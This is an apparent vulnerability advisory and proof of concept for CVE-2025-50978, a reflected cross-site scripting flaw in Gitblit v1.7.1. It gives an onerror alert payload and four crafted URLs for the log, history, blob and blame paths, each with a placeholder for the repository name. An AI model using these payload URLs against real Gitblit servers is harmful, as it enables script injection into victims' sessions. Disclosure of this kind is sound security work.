CVE-2025-50978



Vulnerability: Reflected XSS via Path

In Gitblit v1.7.1, a reflected cross-site scripting (XSS) vulnerability exists in the way repository path names are handled. By injecting a specially crafted path payload—such as ```"%22><img src=a onerror=alert(1)>"``` an attacker can cause arbitrary JavaScript to execute when a victim views the manipulated URL. This flaw stems from insufficient input sanitization of filename elements.




Version: ```v1.7.1```


Authenticated: Yes, possibly unauthenticated

User: Admin




Payload: ```%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3e```

None of these will work for your instance.  You need to replace the repo names ```<REPLACE ME>``` with the exisiting ones.

```http://172.18.0.34/log/<REPLACE ME>.git/master%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3e```

```http://172.18.0.34/history/<REPLACE ME>.git/mastery%3cimg%20src%3da%20onerror%3dalert(1)%3e```

```http://172.18.0.34/blob/<REPLACE ME>.git/master/README.md%3cimg%20src%3da%20onerror%3dalert(1)%3e```

```http://172.18.0.34/blame/<REPLACE ME>.git/master/README.md%3cimg%20src%3da%20onerror%3dalert(1)%3e?star=true```


Demo:

![](https://github.com/4rdr/proofs/blob/main/gifs/gitblit-v1.7.1-reflected-XSS-via-filenames.gif?raw=true)
